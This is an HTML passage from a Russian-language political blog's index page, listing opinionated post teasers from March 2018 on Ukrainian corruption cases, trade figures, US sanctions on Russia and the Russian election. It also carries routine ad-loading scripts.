			<a class="more-link" href="https://www.economics-prorok.com/2018/03/%d0%be%d0%b4%d0%bd%d0%be%d0%ba%d1%83%d1%80%d1%81%d0%bd%d0%b8%d0%ba-%d0%bf%d1%83%d1%82%d0%b8%d0%bd%d0%b0-%d1%8d%d0%ba%d1%81-%d1%80%d0%b0%d0%b7%d0%b2%d0%b5%d0%b4%d1%87%d0%b8%d0%ba-%d0%ba%d0%b3%d0%b1.html#more-42202" title="Однокурсник Путина, экс-разведчик КГБ: «Российские спецслужбы занимаются не разведкой, а крышеванием проституции и торговлей кокаином»">Читать далее</a>
		</p>
		
	</div> 
	</article>


<article class="post-42199 post type-post status-publish format-standard has-post-thumbnail hentry tag-6776 tag-6777 tag-6775 anons">		<h2><a href="https://www.economics-prorok.com/2018/03/%d0%b4%d0%b0%d0%b5%d1%88%d1%8c-%d1%83%d0%bb%d1%83%d1%87%d1%88%d0%b5%d0%bd%d0%b8%d0%b5-%d0%b8%d0%bd%d0%b2%d0%b5%d1%81%d1%82%d0%b8%d1%86%d0%b8%d0%be%d0%bd%d0%bd%d0%be%d0%b3%d0%be-%d0%ba%d0%bb%d0%b8.html" title="Даешь улучшение инвестиционного климата! ГПУ проводит 15 обысков в офисах &#171;Новой почты&#187;">Даешь улучшение инвестиционного климата! ГПУ проводит 15 обысков в офисах &#171;Новой почты&#187;</a></h2>
		<aside class="meta"><span class="date">Март 16, 2018</span><span class="comments"><a href="https://www.economics-prorok.com/2018/03/%d0%b4%d0%b0%d0%b5%d1%88%d1%8c-%d1%83%d0%bb%d1%83%d1%87%d1%88%d0%b5%d0%bd%d0%b8%d0%b5-%d0%b8%d0%bd%d0%b2%d0%b5%d1%81%d1%82%d0%b8%d1%86%d0%b8%d0%be%d0%bd%d0%bd%d0%be%d0%b3%d0%be-%d0%ba%d0%bb%d0%b8.html#respond">Комментарии: 0</a></span><span class="tags">Метки: <a href="https://www.economics-prorok.com/tag/%d0%b2%d0%bb%d0%b0%d0%b4%d0%b8%d0%bc%d0%b8%d1%80-%d0%bf%d0%be%d0%bf%d0%b5%d1%80%d0%b5%d1%88%d0%bd%d1%8e%d0%ba" rel="tag">Владимир Поперешнюк</a>, <a href="https://www.economics-prorok.com/tag/%d0%bb%d0%b0%d1%80%d0%b8%d1%81%d0%b0-%d1%81%d0%b0%d1%80%d0%b3%d0%b0%d0%bd" rel="tag">Лариса Сарган</a>, <a href="https://www.economics-prorok.com/tag/%d0%be%d0%b1%d1%8b%d1%81%d0%ba%d0%b8-%d0%b2-%d0%bd%d0%be%d0%b2%d0%be%d0%b9-%d0%bf%d0%be%d1%87%d1%82%d0%b5" rel="tag">обыски в Новой почте</a></span></aside>	<div class="entry-box clearfix" >

						<a href="https://www.economics-prorok.com/2018/03/%d0%b4%d0%b0%d0%b5%d1%88%d1%8c-%d1%83%d0%bb%d1%83%d1%87%d1%88%d0%b5%d0%bd%d0%b8%d0%b5-%d0%b8%d0%bd%d0%b2%d0%b5%d1%81%d1%82%d0%b8%d1%86%d0%b8%d0%be%d0%bd%d0%bd%d0%be%d0%b3%d0%be-%d0%ba%d0%bb%d0%b8.html" title="Даешь улучшение инвестиционного климата! ГПУ проводит 15 обысков в офисах &#171;Новой почты&#187;" class="anons-thumbnail">
					<img width="300" height="189" src="https://www.economics-prorok.com/wp-content/uploads/2018/03/2129686-300x189.jpg" class="thumbnail wp-post-image" alt="" srcset="https://www.economics-prorok.com/wp-content/uploads/2018/03/2129686-300x189.jpg 300w, https://www.economics-prorok.com/wp-content/uploads/2018/03/2129686.jpg 610w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
				<p>Вчера в статье «Спасибо Порошенко за «реформы»: Украина продолжила стремительное падение в мировом рейтинге счастья» я рассказал о снижении этого рейтинга, а заодно напомнил об ухудшении многих других рейтингов Украины при нынешней власти и, в том числе, о коррупционном рекорде страны. Сейчас же хочу сообщить об одном сегодняшнем событии, которое объясняет, почему происходит такое ухудшение.</p>
		<p class="more-link-box">
			<a class="more-link" href="https://www.economics-prorok.com/2018/03/%d0%b4%d0%b0%d0%b5%d1%88%d1%8c-%d1%83%d0%bb%d1%83%d1%87%d1%88%d0%b5%d0%bd%d0%b8%d0%b5-%d0%b8%d0%bd%d0%b2%d0%b5%d1%81%d1%82%d0%b8%d1%86%d0%b8%d0%be%d0%bd%d0%bd%d0%be%d0%b3%d0%be-%d0%ba%d0%bb%d0%b8.html#more-42199" title="Даешь улучшение инвестиционного климата! ГПУ проводит 15 обысков в офисах &#171;Новой почты&#187;">Читать далее</a>
		</p>
		
	</div> 
	</article>


<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block"
     data-ad-format="autorelaxed"
     data-ad-client="ca-pub-6900864180824447"
     data-ad-slot="8669735008"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>

    
<article class="post-42196 post type-post status-publish format-standard has-post-thumbnail hentry tag-82 tag-3 anons">		<h2><a href="https://www.economics-prorok.com/2018/03/%d0%b2%d0%bd%d0%b5%d1%88%d0%bd%d0%b5%d1%82%d0%be%d1%80%d0%b3%d0%be%d0%b2%d1%8b%d0%b9-%d0%b4%d0%b5%d1%84%d0%b8%d1%86%d0%b8%d1%82-%d1%83%d0%ba%d1%80%d0%b0%d0%b8%d0%bd%d1%8b-%d0%b2%d1%8b%d1%80%d0%be.html" title="Внешнеторговый дефицит Украины вырос в 8 раз">Внешнеторговый дефицит Украины вырос в 8 раз</a></h2>
		<aside class="meta"><span class="date">Март 16, 2018</span><span class="comments"><a href="https://www.economics-prorok.com/2018/03/%d0%b2%d0%bd%d0%b5%d1%88%d0%bd%d0%b5%d1%82%d0%be%d1%80%d0%b3%d0%be%d0%b2%d1%8b%d0%b9-%d0%b4%d0%b5%d1%84%d0%b8%d1%86%d0%b8%d1%82-%d1%83%d0%ba%d1%80%d0%b0%d0%b8%d0%bd%d1%8b-%d0%b2%d1%8b%d1%80%d0%be.html#respond">Комментарии: 0</a></span><span class="tags">Метки: <a href="https://www.economics-prorok.com/tag/%d0%b2%d0%bd%d0%b5%d1%88%d0%bd%d1%8f%d1%8f-%d1%82%d0%be%d1%80%d0%b3%d0%be%d0%b2%d0%bb%d1%8f-%d1%83%d0%ba%d1%80%d0%b0%d0%b8%d0%bd%d1%8b" rel="tag">внешняя торговля Украины</a>, <a href="https://www.economics-prorok.com/tag/%d0%b3%d1%80%d0%be%d0%b9%d1%81%d0%bc%d0%b0%d0%bd" rel="tag">Гройсман</a></span></aside>	<div class="entry-box clearfix" >

						<a href="https://www.economics-prorok.com/2018/03/%d0%b2%d0%bd%d0%b5%d1%88%d0%bd%d0%b5%d1%82%d0%be%d1%80%d0%b3%d0%be%d0%b2%d1%8b%d0%b9-%d0%b4%d0%b5%d1%84%d0%b8%d1%86%d0%b8%d1%82-%d1%83%d0%ba%d1%80%d0%b0%d0%b8%d0%bd%d1%8b-%d0%b2%d1%8b%d1%80%d0%be.html" title="Внешнеторговый дефицит Украины вырос в 8 раз" class="anons-thumbnail">
					<img width="300" height="169" src="https://www.economics-prorok.com/wp-content/uploads/2018/03/maxresdefault-6-300x169.jpg" class="thumbnail wp-post-image" alt="" srcset="https://www.economics-prorok.com/wp-content/uploads/2018/03/maxresdefault-6-300x169.jpg 300w, https://www.economics-prorok.com/wp-content/uploads/2018/03/maxresdefault-6-768x432.jpg 768w, https://www.economics-prorok.com/wp-content/uploads/2018/03/maxresdefault-6-1024x576.jpg 1024w, https://www.economics-prorok.com/wp-content/uploads/2018/03/maxresdefault-6.jpg 1280w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
				<p>Интересно, Гройсман видел данные цифры по торговле Украины с Россией и понимает ли, что они значат? Или его удел — лишь организация поставок барж с арбузами из Херсона в Киев с последующим бахвальством этими «достижениями»?..</p>
		<p class="more-link-box">
			<a class="more-link" href="https://www.economics-prorok.com/2018/03/%d0%b2%d0%bd%d0%b5%d1%88%d0%bd%d0%b5%d1%82%d0%be%d1%80%d0%b3%d0%be%d0%b2%d1%8b%d0%b9-%d0%b4%d0%b5%d1%84%d0%b8%d1%86%d0%b8%d1%82-%d1%83%d0%ba%d1%80%d0%b0%d0%b8%d0%bd%d1%8b-%d0%b2%d1%8b%d1%80%d0%be.html#more-42196" title="Внешнеторговый дефицит Украины вырос в 8 раз">Читать далее</a>
		</p>
		
	</div> 
	</article>


<article class="post-42191 post type-post status-publish format-standard has-post-thumbnail hentry tag-3940 tag-6646 tag-820 anons">		<h2><a href="https://www.economics-prorok.com/2018/03/%d1%82%d1%80%d0%b0%d0%bc%d0%bf-%d0%b4%d0%be%d0%bb%d0%b6%d0%b5%d0%bd-%d0%bd%d0%b5%d0%b7%d0%b0%d0%bc%d0%b5%d0%b4%d0%bb%d0%b8%d1%82%d0%b5%d0%bb%d1%8c%d0%bd%d0%be-%d0%bf%d1%80%d0%b5%d0%b4%d0%bf%d1%80.html" title="Трамп должен незамедлительно предпринять гораздо более серьезные действия против России &#8212; The Washington Post">Трамп должен незамедлительно предпринять гораздо более серьезные действия против России &#8212; The Washington Post</a></h2>
		<aside class="meta"><span class="date">Март 16, 2018</span><span class="comments"><a href="https://www.economics-prorok.com/2018/03/%d1%82%d1%80%d0%b0%d0%bc%d0%bf-%d0%b4%d0%be%d0%bb%d0%b6%d0%b5%d0%bd-%d0%bd%d0%b5%d0%b7%d0%b0%d0%bc%d0%b5%d0%b4%d0%bb%d0%b8%d1%82%d0%b5%d0%bb%d1%8c%d0%bd%d0%be-%d0%bf%d1%80%d0%b5%d0%b4%d0%bf%d1%80.html#respond">Комментарии: 0</a></span><span class="tags">Метки: <a href="https://www.economics-prorok.com/tag/%d0%bd%d0%be%d0%b2%d1%8b%d0%b5-%d1%81%d0%b0%d0%bd%d0%ba%d1%86%d0%b8%d0%b8-%d1%81%d1%88%d0%b0-%d0%bf%d1%80%d0%be%d1%82%d0%b8%d0%b2-%d1%80%d0%be%d1%81%d1%81%d0%b8%d0%b8" rel="tag">новые санкции США против России</a>, <a href="https://www.economics-prorok.com/tag/%d0%be%d1%82%d1%80%d0%b0%d0%b2%d0%bb%d0%b5%d0%bd%d0%b8%d0%b5-%d1%81%d0%ba%d1%80%d0%b8%d0%bf%d0%b0%d0%bb%d1%8f" rel="tag">отравление Скрипаля</a>, <a href="https://www.economics-prorok.com/tag/%d1%81%d1%88%d0%b0-%d0%bf%d1%80%d0%be%d1%82%d0%b8%d0%b2-%d1%80%d0%be%d1%81%d1%81%d0%b8%d0%b8" rel="tag">США против России</a></span></aside>	<div class="entry-box clearfix" >

						<a href="https://www.economics-prorok.com/2018/03/%d1%82%d1%80%d0%b0%d0%bc%d0%bf-%d0%b4%d0%be%d0%bb%d0%b6%d0%b5%d0%bd-%d0%bd%d0%b5%d0%b7%d0%b0%d0%bc%d0%b5%d0%b4%d0%bb%d0%b8%d1%82%d0%b5%d0%bb%d1%8c%d0%bd%d0%be-%d0%bf%d1%80%d0%b5%d0%b4%d0%bf%d1%80.html" title="Трамп должен незамедлительно предпринять гораздо более серьезные действия против России &#8212; The Washington Post" class="anons-thumbnail">
					<img width="300" height="200" src="https://www.economics-prorok.com/wp-content/uploads/2018/03/crop-300x200.jpeg" class="thumbnail wp-post-image" alt="" srcset="https://www.economics-prorok.com/wp-content/uploads/2018/03/crop-300x200.jpeg 300w, https://www.economics-prorok.com/wp-content/uploads/2018/03/crop.jpeg 600w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
				<p>В четверг, 15 марта, власть, отличительная черта которой — это нежелание критиковать Россию (фашистское государство, признанное Законом Украины от 20.02.18 страной-агрессором), столкнулась с необходимостью сменить тон разговора. Белый дом подписал многостороннее заявление, в котором Россия осуждалась за отравление людей на территории Великобритании при помощи военного нервно-паралитического вещества. В то же время министерство финансов представило санкции в отношении пяти российских организаций и 19 россиян &#8230;</p>
		<p class="more-link-box">
			<a class="more-link" href="https://www.economics-prorok.com/2018/03/%d1%82%d1%80%d0%b0%d0%bc%d0%bf-%d0%b4%d0%be%d0%bb%d0%b6%d0%b5%d0%bd-%d0%bd%d0%b5%d0%b7%d0%b0%d0%bc%d0%b5%d0%b4%d0%bb%d0%b8%d1%82%d0%b5%d0%bb%d1%8c%d0%bd%d0%be-%d0%bf%d1%80%d0%b5%d0%b4%d0%bf%d1%80.html#more-42191" title="Трамп должен незамедлительно предпринять гораздо более серьезные действия против России &#8212; The Washington Post">Читать далее</a>
		</p>
		
	</div> 
	</article>


<article class="post-42188 post type-post status-publish format-standard has-post-thumbnail hentry tag-179 tag-5142 tag-2722 anons">		<h2><a href="https://www.economics-prorok.com/2018/03/%d0%b2%d1%8b%d0%b1%d0%be%d1%80%d1%8b-%d0%b3%d0%bb%d0%b0%d0%b2%d0%bd%d0%be%d0%b3%d0%be-%d1%82%d0%b5%d1%80%d1%80%d0%be%d1%80%d0%b8%d1%81%d1%82%d0%b0-%d0%b0%d0%bb%d0%b5%d0%ba%d1%81%d0%b0%d0%bd.html" title="Выборы главного террориста — Александр Сотник">Выборы главного террориста — Александр Сотник</a></h2>
		<aside class="meta"><span class="date">Март 16, 2018</span><span class="comments"><a href="https://www.economics-prorok.com/2018/03/%d0%b2%d1%8b%d0%b1%d0%be%d1%80%d1%8b-%d0%b3%d0%bb%d0%b0%d0%b2%d0%bd%d0%be%d0%b3%d0%be-%d1%82%d0%b5%d1%80%d1%80%d0%be%d1%80%d0%b8%d1%81%d1%82%d0%b0-%d0%b0%d0%bb%d0%b5%d0%ba%d1%81%d0%b0%d0%bd.html#comments">Комментарии: 1</a></span><span class="tags">Метки: <a href="https://www.economics-prorok.com/tag/%d0%b0%d0%bb%d0%b5%d0%ba%d1%81%d0%b0%d0%bd%d0%b4%d1%80-%d1%81%d0%be%d1%82%d0%bd%d0%b8%d0%ba" rel="tag">Александр Сотник</a>, <a href="https://www.economics-prorok.com/tag/%d0%b2%d1%8b%d0%b1%d0%be%d1%80%d1%8b-%d0%bf%d1%80%d0%b5%d0%b7%d0%b8%d0%b4%d0%b5%d0%bd%d1%82%d0%b0-%d1%80%d0%be%d1%81%d1%81%d0%b8%d0%b8" rel="tag">выборы президента России</a>, <a href="https://www.economics-prorok.com/tag/%d0%bf%d1%83%d1%82%d0%b8%d0%bd-%d1%82%d0%b5%d1%80%d1%80%d0%be%d1%80%d0%b8%d1%81%d1%82" rel="tag">Путин террорист</a></span></aside>	<div class="entry-box clearfix" >

						<a href="https://www.economics-prorok.com/2018/03/%d0%b2%d1%8b%d0%b1%d0%be%d1%80%d1%8b-%d0%b3%d0%bb%d0%b0%d0%b2%d0%bd%d0%be%d0%b3%d0%be-%d1%82%d0%b5%d1%80%d1%80%d0%be%d1%80%d0%b8%d1%81%d1%82%d0%b0-%d0%b0%d0%bb%d0%b5%d0%ba%d1%81%d0%b0%d0%bd.html" title="Выборы главного террориста — Александр Сотник" class="anons-thumbnail">
					<img width="300" height="189" src="https://www.economics-prorok.com/wp-content/uploads/2018/03/1467572095_putin-terrorist-300x189.jpg" class="thumbnail wp-post-image" alt="" srcset="https://www.economics-prorok.com/wp-content/uploads/2018/03/1467572095_putin-terrorist-300x189.jpg 300w, https://www.economics-prorok.com/wp-content/uploads/2018/03/1467572095_putin-terrorist.jpg 690w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
				<p>Выбирай – не выбирай, мы в Аду построим рай!</p>
		<p class="more-link-box">
			<a class="more-link" href="https://www.economics-prorok.com/2018/03/%d0%b2%d1%8b%d0%b1%d0%be%d1%80%d1%8b-%d0%b3%d0%bb%d0%b0%d0%b2%d0%bd%d0%be%d0%b3%d0%be-%d1%82%d0%b5%d1%80%d1%80%d0%be%d1%80%d0%b8%d1%81%d1%82%d0%b0-%d0%b0%d0%bb%d0%b5%d0%ba%d1%81%d0%b0%d0%bd.html#more-42188" title="Выборы главного террориста — Александр Сотник">Читать далее</a>
		</p>
		
	</div> 
	</article>


<article class="post-42185 post type-post status-publish format-standard has-post-thumbnail hentry tag-6772 tag-6774 tag-6773 anons">		<h2><a href="https://www.economics-prorok.com/2018/03/%d0%bd%d0%b0%d0%b1%d1%83-%d0%bd%d0%b0%d1%87%d0%b0%d0%bb%d0%be-%d1%80%d0%b0%d1%81%d1%81%d0%bb%d0%b5%d0%b4%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d0%b5-%d0%bf%d1%80%d0%be%d1%82%d0%b8%d0%b2-%d1%8e%d1%80%d0%b8.html" title="НАБУ начало расследование против юриста Порошенко">НАБУ начало расследование против юриста Порошенко</a></h2>
		<aside class="meta"><span class="date">Март 16, 2018</span><span class="comments"><a href="https://www.economics-prorok.com/2018/03/%d0%bd%d0%b0%d0%b1%d1%83-%d0%bd%d0%b0%d1%87%d0%b0%d0%bb%d0%be-%d1%80%d0%b0%d1%81%d1%81%d0%bb%d0%b5%d0%b4%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d0%b5-%d0%bf%d1%80%d0%be%d1%82%d0%b8%d0%b2-%d1%8e%d1%80%d0%b8.html#respond">Комментарии: 0</a></span><span class="tags">Метки: <a href="https://www.economics-prorok.com/tag/%d0%b0%d0%bb%d0%b5%d0%ba%d1%81%d0%b5%d0%b9-%d0%bc%d0%b0%d0%bb%d0%be%d0%b2%d0%b0%d1%86%d0%ba%d0%b8%d0%b9" rel="tag">Алексей Маловацкий</a>, <a href="https://www.economics-prorok.com/tag/%d0%bd%d0%b0%d0%b1%d1%83-%d0%bf%d1%80%d0%be%d1%82%d0%b8%d0%b2-%d1%8e%d1%80%d0%b8%d1%81%d1%82%d0%b0-%d0%bf%d0%be%d1%80%d0%be%d1%88%d0%b5%d0%bd%d0%ba%d0%be" rel="tag">НАБУ против юриста Порошенко</a>, <a href="https://www.economics-prorok.com/tag/%d1%8e%d1%80%d0%b8%d1%81%d1%82-%d0%bf%d0%be%d1%80%d0%be%d1%88%d0%b5%d0%bd%d0%ba%d0%be" rel="tag">Юрист Порошенко</a></span></aside>	<div class="entry-box clearfix" >

						<a href="https://www.economics-prorok.com/2018/03/%d0%bd%d0%b0%d0%b1%d1%83-%d0%bd%d0%b0%d1%87%d0%b0%d0%bb%d0%be-%d1%80%d0%b0%d1%81%d1%81%d0%bb%d0%b5%d0%b4%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d0%b5-%d0%bf%d1%80%d0%be%d1%82%d0%b8%d0%b2-%d1%8e%d1%80%d0%b8.html" title="НАБУ начало расследование против юриста Порошенко" class="anons-thumbnail">
					<img width="300" height="200" src="https://www.economics-prorok.com/wp-content/uploads/2018/03/565809_1228441-300x200.jpg" class="thumbnail wp-post-image" alt="" srcset="https://www.economics-prorok.com/wp-content/uploads/2018/03/565809_1228441-300x200.jpg 300w, https://www.economics-prorok.com/wp-content/uploads/2018/03/565809_1228441.jpg 620w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
				<p>Национальное антикоррупционное бюро (НАБУ) открыло уголовное дело против члена Вышей рады правосудия Алексея Маловацкого.</p>
		<p class="more-link-box">
			<a class="more-link" href="https://www.economics-prorok.com/2018/03/%d0%bd%d0%b0%d0%b1%d1%83-%d0%bd%d0%b0%d1%87%d0%b0%d0%bb%d0%be-%d1%80%d0%b0%d1%81%d1%81%d0%bb%d0%b5%d0%b4%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d0%b5-%d0%bf%d1%80%d0%be%d1%82%d0%b8%d0%b2-%d1%8e%d1%80%d0%b8.html#more-42185" title="НАБУ начало расследование против юриста Порошенко">Читать далее</a>
		</p>
		
	</div> 
	</article>


<article class="post-42182 post type-post status-publish format-standard has-post-thumbnail hentry tag-4542 tag-6692 tag-256 anons">		<h2><a href="https://www.economics-prorok.com/2018/03/%d1%82%d0%b5%d1%80%d0%b0%d0%ba%d1%82%d1%8b-%d1%82%d0%b5%d1%80%d0%b0%d0%ba%d1%82%d1%8b-%d0%ba%d1%80%d1%83%d0%b3%d0%be%d0%bc-%d0%be%d0%b4%d0%bd%d0%b8-%d1%82%d0%b5%d1%80%d0%b0%d0%ba%d1%82%d1%8b.html" title="Теракты, теракты, кругом одни теракты">Теракты, теракты, кругом одни теракты</a></h2>
		<aside class="meta"><span class="date">Март 16, 2018</span><span class="comments"><a href="https://www.economics-prorok.com/2018/03/%d1%82%d0%b5%d1%80%d0%b0%d0%ba%d1%82%d1%8b-%d1%82%d0%b5%d1%80%d0%b0%d0%ba%d1%82%d1%8b-%d0%ba%d1%80%d1%83%d0%b3%d0%be%d0%bc-%d0%be%d0%b4%d0%bd%d0%b8-%d1%82%d0%b5%d1%80%d0%b0%d0%ba%d1%82%d1%8b.html#comments">Комментарии: 4</a></span><span class="tags">Метки: <a href="https://www.economics-prorok.com/tag/%d0%b0%d0%bb%d0%b5%d0%ba%d1%81%d0%b0%d0%bd%d0%b4%d1%80-%d0%ba%d0%be%d1%87%d0%b5%d1%82%d0%ba%d0%be%d0%b2" rel="tag">Александр Кочетков</a>, <a href="https://www.economics-prorok.com/tag/%d0%b4%d0%b5%d0%bb%d0%be-%d1%80%d1%83%d0%b1%d0%b0%d0%bd%d0%b0" rel="tag">дело Рубана</a>, <a href="https://www.economics-prorok.com/tag/%d0%bd%d0%b0%d0%b4%d0%b5%d0%b6%d0%b4%d0%b0-%d1%81%d0%b0%d0%b2%d1%87%d0%b5%d0%bd%d0%ba%d0%be" rel="tag">Надежда Савченко</a></span></aside>	<div class="entry-box clearfix" >

						<a href="https://www.economics-prorok.com/2018/03/%d1%82%d0%b5%d1%80%d0%b0%d0%ba%d1%82%d1%8b-%d1%82%d0%b5%d1%80%d0%b0%d0%ba%d1%82%d1%8b-%d0%ba%d1%80%d1%83%d0%b3%d0%be%d0%bc-%d0%be%d0%b4%d0%bd%d0%b8-%d1%82%d0%b5%d1%80%d0%b0%d0%ba%d1%82%d1%8b.html" title="Теракты, теракты, кругом одни теракты" class="anons-thumbnail">
					<img width="300" height="195" src="https://www.economics-prorok.com/wp-content/uploads/2018/03/Bez-nazvanyya-7-1-900x586-300x195.jpg" class="thumbnail wp-post-image" alt="" srcset="https://www.economics-prorok.com/wp-content/uploads/2018/03/Bez-nazvanyya-7-1-900x586-300x195.jpg 300w, https://www.economics-prorok.com/wp-content/uploads/2018/03/Bez-nazvanyya-7-1-900x586-768x500.jpg 768w, https://www.economics-prorok.com/wp-content/uploads/2018/03/Bez-nazvanyya-7-1-900x586.jpg 900w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
				<p>Чтобы стать вторым Уинстоном Черчиллем, как рисуют прихлебатели, недостаточно весить за центнер и употреблять по литру виски в день. Кроме мозга, безошибочно калькулирующего баксы, надо иметь еще и сердце, горящее справедливостью.</p>
		<p class="more-link-box">
			<a class="more-link" href="https://www.economics-prorok.com/2018/03/%d1%82%d0%b5%d1%80%d0%b0%d0%ba%d1%82%d1%8b-%d1%82%d0%b5%d1%80%d0%b0%d0%ba%d1%82%d1%8b-%d0%ba%d1%80%d1%83%d0%b3%d0%be%d0%bc-%d0%be%d0%b4%d0%bd%d0%b8-%d1%82%d0%b5%d1%80%d0%b0%d0%ba%d1%82%d1%8b.html#more-42182" title="Теракты, теракты, кругом одни теракты">Читать далее</a>
		</p>
		
	</div> 
	</article>

<!-- start NEW_Main_v1 for economics-prorok.com -->
<div id="adpartner-jsunit-1947">
    <script type="text/javascript">
        var head = document.getElementsByTagName('head')[0];
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = "//a4p.adpartner.pro/jsunit?id=1947&" + Math.random();
        head.appendChild(script);
    </script>
</div>
<!-- end NEW_Main_v1 for economics-prorok.com -->
	
<article class="post-42179 post type-post status-publish format-standard has-post-thumbnail hentry tag-6771 tag-5034 anons">		<h2><a href="https://www.economics-prorok.com/2018/03/cnn-%d0%bd%d0%b5%d0%bf%d0%be%d1%81%d0%bb%d0%b5%d0%b4%d0%be%d0%b2%d0%b0%d1%82%d0%b5%d0%bb%d1%8c%d0%bd%d0%be%d1%81%d1%82%d1%8c-%d1%82%d1%80%d0%b0%d0%bc%d0%bf%d0%b0-%d1%8d%d1%82.html" title="CNN: «непоследовательность» Трампа — это дополнительное подтверждение его связей с Россией">CNN: «непоследовательность» Трампа — это дополнительное подтверждение его связей с Россией</a></h2>
		<aside class="meta"><span class="date">Март 16, 2018</span><span class="comments"><a href="https://www.economics-prorok.com/2018/03/cnn-%d0%bd%d0%b5%d0%bf%d0%be%d1%81%d0%bb%d0%b5%d0%b4%d0%be%d0%b2%d0%b0%d1%82%d0%b5%d0%bb%d1%8c%d0%bd%d0%be%d1%81%d1%82%d1%8c-%d1%82%d1%80%d0%b0%d0%bc%d0%bf%d0%b0-%d1%8d%d1%82.html#respond">Комментарии: 0</a></span><span class="tags">Метки: <a href="https://www.economics-prorok.com/tag/%d0%bf%d0%b8%d1%82%d0%b5%d1%80-%d0%bc%d1%8d%d1%82%d1%8c%d1%8e%d1%81" rel="tag">Питер Мэтьюс</a>, <a href="https://www.economics-prorok.com/tag/%d1%81%d0%b2%d1%8f%d0%b7%d0%b8-%d1%82%d1%80%d0%b0%d0%bc%d0%bf%d0%b0-%d1%81-%d1%80%d0%be%d1%81%d1%81%d0%b8%d0%b5%d0%b9" rel="tag">связи Трампа с Россией</a></span></aside>	<div class="entry-box clearfix" >

						<a href="https://www.economics-prorok.com/2018/03/cnn-%d0%bd%d0%b5%d0%bf%d0%be%d1%81%d0%bb%d0%b5%d0%b4%d0%be%d0%b2%d0%b0%d1%82%d0%b5%d0%bb%d1%8c%d0%bd%d0%be%d1%81%d1%82%d1%8c-%d1%82%d1%80%d0%b0%d0%bc%d0%bf%d0%b0-%d1%8d%d1%82.html" title="CNN: «непоследовательность» Трампа — это дополнительное подтверждение его связей с Россией" class="anons-thumbnail">
					<img width="300" height="169" src="https://www.economics-prorok.com/wp-content/uploads/2018/03/6736F179-5155-4CCF-974D-5441A1C819C7_cx0_cy1_cw0_w1023_r1_s-300x169.jpg" class="thumbnail wp-post-image" alt="" srcset="https://www.economics-prorok.com/wp-content/uploads/2018/03/6736F179-5155-4CCF-974D-5441A1C819C7_cx0_cy1_cw0_w1023_r1_s-300x169.jpg 300w, https://www.economics-prorok.com/wp-content/uploads/2018/03/6736F179-5155-4CCF-974D-5441A1C819C7_cx0_cy1_cw0_w1023_r1_s-768x432.jpg 768w, https://www.economics-prorok.com/wp-content/uploads/2018/03/6736F179-5155-4CCF-974D-5441A1C819C7_cx0_cy1_cw0_w1023_r1_s.jpg 1023w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
				<p>Дональд Трамп был вынужден ужесточить санкции против России (фашистское государство, признанное Законом Украины от 20.02.18 страной-агрессором), так как испытывал сильное давление и больше не мог отрицать наличие доказательств вмешательства Москвы в президентские выборы. Однако крайняя непоследовательность президента в этом важнейшем вопросе вызывает подозрения: а нет ли у русских чего-то на Трампа?</p>
		<p class="more-link-box">
			<a class="more-link" href="https://www.economics-prorok.com/2018/03/cnn-%d0%bd%d0%b5%d0%bf%d0%be%d1%81%d0%bb%d0%b5%d0%b4%d0%be%d0%b2%d0%b0%d1%82%d0%b5%d0%bb%d1%8c%d0%bd%d0%be%d1%81%d1%82%d1%8c-%d1%82%d1%80%d0%b0%d0%bc%d0%bf%d0%b0-%d1%8d%d1%82.html#more-42179" title="CNN: «непоследовательность» Трампа — это дополнительное подтверждение его связей с Россией">Читать далее</a>
		</p>
		
	</div> 
	</article>


<article class="post-42176 post type-post status-publish format-standard has-post-thumbnail hentry tag-256 tag-1629 tag-4635 tag-19 anons">		<h2><a href="https://www.economics-prorok.com/2018/03/%d1%83%d0%ba%d1%80%d0%b0%d0%b8%d0%bd%d1%81%d0%ba%d0%b8%d0%b9-%d0%bd%d0%b0%d1%80%d0%be%d0%b4-%d0%bd%d0%b5%d0%bd%d0%b0%d0%b2%d0%b8%d0%b4%d0%b8%d1%82-%d0%bd%d1%8b%d0%bd%d0%b5%d1%88%d0%bd%d1%8e%d1%8e.html" title="Украинский народ ненавидит нынешнюю омерзительную власть. Рано или поздно ситуация взорвется">Украинский народ ненавидит нынешнюю омерзительную власть. Рано или поздно ситуация взорвется</a></h2>
		<aside class="meta"><span class="date">Март 16, 2018</span><span class="comments"><a href="https://www.economics-prorok.com/2018/03/%d1%83%d0%ba%d1%80%d0%b0%d0%b8%d0%bd%d1%81%d0%ba%d0%b8%d0%b9-%d0%bd%d0%b0%d1%80%d0%be%d0%b4-%d0%bd%d0%b5%d0%bd%d0%b0%d0%b2%d0%b8%d0%b4%d0%b8%d1%82-%d0%bd%d1%8b%d0%bd%d0%b5%d1%88%d0%bd%d1%8e%d1%8e.html#comments">Комментарии: 7</a></span><span class="tags">Метки: <a href="https://www.economics-prorok.com/tag/%d0%bd%d0%b0%d0%b4%d0%b5%d0%b6%d0%b4%d0%b0-%d1%81%d0%b0%d0%b2%d1%87%d0%b5%d0%bd%d0%ba%d0%be" rel="tag">Надежда Савченко</a>, <a href="https://www.economics-prorok.com/tag/%d1%81%d0%b2%d0%b5%d1%80%d0%b6%d0%b5%d0%bd%d0%b8%d0%b5-%d0%bf%d0%be%d1%80%d0%be%d1%88%d0%b5%d0%bd%d0%ba%d0%be" rel="tag">свержение Порошенко</a>, <a href="https://www.economics-prorok.com/tag/%d1%81%d1%82%d0%b0%d0%bd%d0%b8%d1%81%d0%bb%d0%b0%d0%b2-%d1%80%d0%b5%d1%87%d0%b8%d0%bd%d1%81%d0%ba%d0%b8%d0%b9" rel="tag">Станислав Речинский</a>, <a href="https://www.economics-prorok.com/tag/%d1%82%d1%80%d0%b5%d1%82%d0%b8%d0%b9-%d0%bc%d0%b0%d0%b9%d0%b4%d0%b0%d0%bd-%d0%b2-%d1%83%d0%ba%d1%80%d0%b0%d0%b8%d0%bd%d0%b5" 